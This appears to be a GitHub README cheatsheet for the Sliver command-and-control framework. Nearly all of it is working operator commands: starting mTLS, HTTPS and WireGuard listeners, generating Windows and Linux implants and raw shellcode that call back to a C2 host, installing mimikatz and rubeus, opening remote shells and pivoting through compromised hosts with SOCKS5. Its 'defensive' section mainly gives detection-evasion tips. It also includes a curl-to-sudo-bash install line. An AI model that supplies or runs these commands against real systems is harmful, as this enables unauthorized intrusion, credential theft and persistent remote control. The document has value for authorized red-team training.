# ⚔️ Sliver C2 - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```

<p align="center">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Bishop Fox">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Red Team">
</p>

<p align="center">
  <b>⚔️ Modern, cross-platform, open-source adversary emulation and Command & Control framework supporting mTLS, WireGuard, HTTP(S), and DNS protocols</b>
</p>

---

## 📋 Table of Contents

- [Overview & Architecture](#-overview--architecture)
- [Installation & Server Setup](#-installation--server-setup)
  - [Automated One-Liner Install](#automated-one-liner-install)
  - [Multiplayer Operator Configuration](#multiplayer-operator-configuration)
- [Listener Configuration (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [Generating Implants (Beacons vs Sessions)](#-generating-implants-beacons-vs-sessions)
  - [Interactive Sessions vs Asynchronous Beacons](#interactive-sessions-vs-asynchronous-beacons)
  - [Windows EXE & Shellcode Implants](#windows-exe--shellcode-implants)
  - [Linux & macOS ELF Implants](#linux--macos-elf-implants)
- [Post-Exploitation & Armory Ecosystem](#-post-exploitation--armory-ecosystem)
  - [Installing Armory Extensions (BOFs, Donut, Seatbelt)](#installing-armory-extensions-bofs-donut-seatbelt)
  - [Credential Access & Mimikatz](#credential-access--mimikatz)
  - [Pivoting & Dynamic SOCKS5](#pivoting--dynamic-socks5)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & Architecture

Engineered in Go by **Bishop Fox**, **Sliver** is one of the premier open-source alternatives to commercial C2 frameworks (Cobalt Strike, Brute Ratel):
- **Cross-Platform:** Server and implants support Windows, Linux, and macOS across `x86_64`, `arm64`, and `arm`.
- **Evasive Communication:** Out-of-the-box support for mutual TLS (mTLS), WireGuard UDP tunnels, HTTP/HTTPS with procedural canary generation, and DNS tunneling.
- **In-Memory Execution:** Native reflective DLL injection, Beacon Object Files (BOFs), inline .NET execution via Donut, and process hollowing.
- **Multiplayer Architecture:** Real-time collaboration between multiple red team operators via cryptographically signed operator profiles.

---

## 📥 Installation & Server Setup

### Automated One-Liner Install
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```

### Multiplayer Operator Configuration
Create an operator profile on the C2 server for a team member:
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```

---

## 🎧 Listener Configuration (mTLS, HTTP, WireGuard, DNS)

Inside the `sliver` console:

```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```

---

## 🚀 Generating Implants (Beacons vs Sessions)

### Interactive Sessions vs Asynchronous Beacons
- **Session:** Real-time TCP/TLS connection with instantaneous command response. Higher network visibility.
- **Beacon:** Asynchronous heartbeat that sleeps for intervals with randomized jitter. Dramatically harder for SOCs to identify via network anomaly analysis.

### Windows EXE & Shellcode Implants
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```

### Linux & macOS ELF Implants
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```

---

## 🛠️ Post-Exploitation & Armory Ecosystem

### Installing Armory Extensions (BOFs, Donut, Seatbelt)
The Armory is Sliver's integrated package manager for third-party offensive tools and Cobalt Strike Beacon Object Files (BOFs):
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```

### Interacting with Sessions and Beacons
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```

### Pivoting & Dynamic SOCKS5
Route external offensive tools directly into the compromised target network:
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```

---

## ⚡ Quick Reference Table

| Objective | Command |
|-----------|---------|
| **Start mTLS Listener** | `mtls --lport 8888` |
| **Start HTTPS Listener** | `https --lport 443 --domain c2.domain.com` |
| **Generate Session EXE** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Generate Beacon EXE** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Generate Raw Shellcode** | `generate --mtls <IP>:8888 -f shellcode` |
| **List & Interact Sessions**| `sessions` -> `use <ID>` |
| **Install Armory Tools** | `armory install seatbelt mimikatz` |
| **In-Memory .NET Execution**| `execute-assembly /path/to/binary.exe <args>` |
| **SOCKS5 Reverse Proxy** | `socks5 start --port 1080` |

---

## 🛡️ Defensive Considerations & Detection

1. **JARM Fingerprinting:** Default Sliver HTTP listeners can be profiled using active JARM TLS fingerprinting. Customize TLS ciphers in Sliver configuration.
2. **YARA & Binary Analysis:** Default implants produced by `generate` contain Golang metadata and symbol structures unless obfuscated via garble (`--skip-symbols`).

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> Sliver is an advanced adversary simulation and red team Command & Control framework. It must be deployed exclusively in authorized engagements with clear rules of engagement (RoE). Unauthorized use on third-party computers is strictly illegal.
